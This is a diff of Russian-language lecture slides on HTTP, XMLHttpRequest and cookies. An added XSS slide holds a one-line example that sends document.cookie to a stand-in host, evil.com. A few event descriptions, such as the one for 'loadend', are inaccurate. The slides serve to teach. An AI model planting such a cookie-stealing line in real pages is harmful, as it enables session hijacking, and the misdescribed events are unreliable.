@@ -610,6 +610,12 @@
 </section>
 
 
+<section class="slide question">
+	<h2>Практика!</h2>
+</section>
+
+
+
 <section class="slide">
 	<h2 class="shout">Работа с сетью</h2>
 </section>
@@ -621,22 +627,24 @@
 			протокол прикладного уровня передачи данных (изначально &mdash; в виде гипертекстовых документов в формате
 			«HTML»), в настоящий момент используется для передачи произвольных данных</p>
 	</blockquote>
+	<p class="note">HTTP &mdash; текстовый протокол (имеются в виду версии протокола до версии HTTP/2)</p>
 </section>
 
 <section class="slide">
 	<h2>Протокол HTTP</h2>
-	<div style="position:relative;width: 100%; height: 75%; overflow: hidden">
-		<img class="place" src="client-server-diagram-internet.png" style="transform-origin: center;transform: translate(-50%,-51.5%) scale(1.4);">
+	<div style="position:relative;width: 100%; height: 75%;">
+		<img class="place" src="client-server-diagram-internet.png" style="transform-origin: center;transform: translate(-50%,-45%) scale(1.4);">
 	</div>
 </section>
 
 <section class="slide">
 	<h2>HTTP запрос</h2>
+	<p class="medium-content"></p>
 	<pre class="hljs http">
 		<code><span class="comment rus">// METHOD URI HTTP/VERSION <= стартовая строка</span></code>
-		<code>GET /hello.html?name=alex HTTP/1.1</code>
-		<code>Host: frontend.tech-mail.ru</code>
-		<code>Content-Type: text/plain; charset=utf-8</code>
+		<code>GET /lib/slides.css HTTP/1.1</code>
+		<code>Host: frontend-park-mailru.firebaseapp.com</code>
+		<code>Content-Type: text/css; charset=utf-8</code>
 		<code><span class="comment rus">другие заголовки...</span></code>
 		<code> </code>
 		<code>        <span class="comment rus">тело запроса (опционально)</span></code>
@@ -646,11 +654,12 @@
 
 <section class="slide">
 	<h2>HTTP ответ</h2>
+	<p class="medium-content"></p>
 	<pre class="hljs http">
 		<code><span class="comment rus">// HTTP/VERSION STATUS_CODE REASON_PHRASE <= стартовая строка</span></code>
 		<code>HTTP/1.0 200 OK</code>
-		<code>Host: frontend.tech-mail.ru</code>
-		<code>Content-Type: text/plain; charset=utf-8</code>
+		<code>Host: frontend-park-mailru.firebaseapp.com</code>
+		<code>Content-Type: text/css; charset=utf-8</code>
 		<code><span class="comment rus">другие заголовки...</span></code>
 		<code> </code>
 		<code>        <span class="comment rus">тело ответа (опционально)</span></code>
@@ -660,11 +669,12 @@
 
 <section class="slide">
 	<h2>Работа с XMLHttpRequest</h2>
+	<p class="medium-content"></p>
 	<pre class="hljs js">
 		<code><span class="comment rus">// 1. Создаём новый объект XMLHttpRequest</span></code>
 		<code>const xhr = new XMLHttpRequest();</code>
-		<code><span class="comment rus">// 2. Конфигурируем его: GET-запрос на URL '/'</span></code>
-		<code>xhr.open('GET', 'phones.json', false);</code>
+		<code><span class="comment rus">// 2. Конфигурируем его: GET-запрос на URL '/lib/slides.css'</span></code>
+		<code>xhr.open('GET', '/lib/slides.css', <mark>false</mark>);</code>
 		<code> </code>
 		<code><span class="comment rus">// 3. Отсылаем запрос</span></code>
 		<code>xhr.send();</code>
@@ -673,13 +683,15 @@
 </section>
 
 <section class="slide">
-	<h2>Работа с сетью в браузере: <br/>XMLHttpRequest</h2>
+	<h2>Работа с XMLHttpRequest</h2>
+	<p class="medium-content"></p>
 	<pre class="hljs js">
 		<code><span class="comment rus">// 4. Если код ответа сервера не 200, то это ошибка</span></code>
-		<code>if (+xhr.status !== 200) {</code>
-		<code>    console.log(`Ответ от сервера: ${xhr.status} ${xhr.statusText}`);</code>
-		<code>} else {</code>
+		<code><span class="comment rus">console.log(`Ответ от сервера: ${xhr.status} ${xhr.statusText}`);</span></code>
+		<code>if (+xhr.status === 200) {</code>
 		<code>    console.log(xhr.responseText);</code>
+		<code>} else {</code>
+		<code>    console.error('Ошибка!')</code>
 		<code>}</code>
 		<code> </code>
 	</pre>
@@ -687,12 +699,13 @@
 
 <section class="slide">
 	<h2>Пример POST-запроса</h2>
+	<p class="medium-content"></p>
 	<pre class="hljs js">
 		<code>const xhr = new XMLHttpRequest();</code>
-		<code>xhr.open('POST', '/post', false);</code>
+		<code>xhr.open('POST', '/post', <mark>false</mark>);</code>
 		<code> </code>
 		<code><span class="comment rus">// Выставляем заголовок</span></code>
-		<code>xhr.setRequestHeader('Content-Type', 'application/json');</code>
+		<code>xhr.<mark>setRequestHeader</mark>('Content-Type', 'application/json; charset=utf-8');</code>
 		<code>xhr.send(JSON.stringify({name: 'Alex'}));</code>
 		<code><span class="comment rus">// ждём ответа</span></code>
 		<code> </code>
@@ -700,18 +713,185 @@
 </section>
 
 <section class="slide">
-	<h2>Асинхронные запросы</h2>
+	<h2><mark>Асинхронные</mark> запросы</h2>
+	<p class="medium-content"></p>
 	<pre class="hljs js">
 		<code>const xhr = new XMLHttpRequest();</code>
-		<code>xhr.open('GET', '/', true);</code>
+		<code>xhr.open('GET', '/lib/slides.css', <mark>true</mark>);</code>
 		<code> </code>
 		<code>xhr.<mark>onreadystatechange</mark> = function() {</code>
 		<code>    if (xhr.<mark>readyState</mark> !== 4) return;</code>
 		<code>    console.log(`Ответ от сервера: ${xhr.status} ${xhr.statusText}`);</code>
 		<code>    console.log(xhr.responseText);</code>
 		<code>}</code>
+		<code>xhr.timeout = 5000; <span class="comment rus">// 5 секунд (в миллисекундах)</span></code>
+		<code>xhr.send();</code>
 		<code> </code>
 	</pre>
+</section>
+
+<section class="slide">
+	<h2>Событие <code>readystatechange</code></h2>
+	<p class="medium-content"></p>
+	<pre class="hljs c">
+		<code><span class="comment rus">// Значения <mark>readyState</mark></span></code>
+		<code>const unsigned short UNSENT = 0; <span class="comment rus">// начальное состояние</span></code>
+		<code>const unsigned short OPENED = 1; <span class="comment rus">// вызван open</span></code>
+		<code>const unsigned short HEADERS_RECEIVED = 2; <span class="comment rus">// получены заголовки</span></code>
+		<code>const unsigned short LOADING = 3; <span class="comment rus">// загружается тело</span></code>
+		<code>const unsigned short DONE = 4; <span class="comment rus">// запрос завершён</span></code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Другие события</h2>
+	<p class="medium-content"></p>
+	<ul lang="ru">
+		<li><code>loadstart</code> &mdash; запрос начат</li>
+		<li><code>progress</code> &mdash; браузер получил очередной пакет данных</li>
+		<li><code>abort</code> &mdash; запрос был отменён вызовом <code>xhr.abort()</code></li>
+		<li><code>error</code> &mdash; произошла ошибка</li>
+		<li><code>load</code> &mdash; запрос был успешно (без ошибок) завершён</li>
+		<li><code>loadend</code> &mdash; запрос был прекращён по таймауту</li>
+		<li><code>readystatechange</code> &mdash; запрос был завершён (успешно или неуспешно)</li>
+	</ul>
+</section>
+
+
+<section class="slide">
+	<h2 class="shout">Cookies</h2>
+</section>
+
+<section class="slide question">
+	<h2>HTTP is a stateless protocol</h2>
+</section>
+
+<section class="slide">
+	<h2>Cookies</h2>
+	<div>
+		<blockquote>
+			<p class="small-content"><b>Куки (cookies)</b> &mdash; небольшой фрагмент данных, отправленный веб-сервером и хранимый на компьютере пользователя. Веб-клиент (обычно веб-браузер) всякий раз при попытке открыть страницу соответствующего сайта пересылает этот фрагмент данных веб-серверу в виде HTTP-запроса</p>
+		</blockquote>
+	</div>
+</section>
+
+<section class="slide">
+	<h2><a href="http://tools.ietf.org/html/rfc2965">Спецификация</a> cookies</h2>
+	<p class="small-content"></p>
+	<ul lang="ru">
+		<li>Браузер должен хранить как минимум 4096 байт кук</li>
+		<li>Минимум 20 шт. на домен</li>
+		<li>Минимум 300 шт. всего</li>
+		<li>Имена <mark>нечувствительны</mark> к регистру</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>1 Клиент → Сервер</h2>
+	<pre class="hljs http">
+			<code>GET / HTTP/1.1</code>
+			<code>Host: example.com</code>
+			<code> </code>
+		</pre>
+</section>
+
+<section class="slide">
+	<h2>2 Клиент ← Сервер</h2>
+	<pre class="hljs http">
+			<code>HTTP/1.1 200 OK</code>
+			<code><mark>Set-Cookie: name=value</mark></code>
+			<code>Content-Type: text/html</code>
+			<code> </code>
+		</pre>
+</section>
+
+<section class="slide">
+	<h2>3 Клиент → Сервер</h2>
+	<pre class="hljs http">
+			<code>GET / HTTP/1.1</code>
+			<code>Host: example.com</code>
+			<code><mark>Cookie: name=value</mark></code>
+			<code> </code>
+		</pre>
+</section>
+
+<section class="slide">
+	<h2>4 Клиент ← Сервер</h2>
+	<pre class="hljs http">
+			<code>HTTP/1.1 200 OK</code>
+			<code><mark>Set-Cookie: name=value2</mark></code>
+			<code>Content-Type: text/html</code>
+			<code> </code>
+		</pre>
+</section>
+
+<section class="slide">
+	<h2>Использование</h2>
+	<p class="small-content"></p>
+	<ul lang="ru">
+		<li>Аутентификация пользователей</li>
+		<li>Хранение настроек пользователей</li>
+		<li>Отслеживание сеанса (сессия)</li>
+		<li>Сбор статистики</li>
+		<li>Проведение экспериментов</li>
+		<li>etc...</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>Set-Cookie</h2>
+	<pre class="hljs http">
+		<code>Set-Cookie: value</code>
+		<code>                 [;<span hidden>X:</span> Expires=date]</code>
+		<code>                 [;<span hidden>X:</span> Max-Age=age]</code>
+		<code>                 [;<span hidden>X:</span> Domain=domain]</code>
+		<code>                 [;<span hidden>X:</span> Path=path]</code>
+		<code>                 [;<span hidden>X:</span> Secure]</code>
+		<code>                 [;<span hidden>X:</span> HttpOnly]</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Cookie ID</h2>
+	<pre class="hljs http">
+		<code>Set-Cookie: name=v1; domain=.example.com; path=/</code>
+		<code>Set-Cookie: name=v2; domain=www.example.com; path=/</code>
+		<code>Set-Cookie: name=v3; domain=.example.com; path=/archive</code>
+		<code> </code>
+	</pre>
+	<pre class="hljs http">
+		<code>Cookie: name=v1; name=v2; name=v3</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>JavaScript</h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
+		<code>document.cookie; /* 'name1=value1' */</code>
+		<code class="next">document.cookie = 'name2=value2';</code>
+		<code class="next">document.cookie; /* 'name1=value1; name2=value2' */</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross Site Scripting</a> (XSS)</h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
+		<code>(new Image()).src = 'http://evil.com/?cookie=' +</code>
+		<code>                    document.cookie;</code>
+	</pre>
+</section>
+
+
+
+
+<section class="slide question">
+	<h2>Практика!</h2>
 </section>
 
 
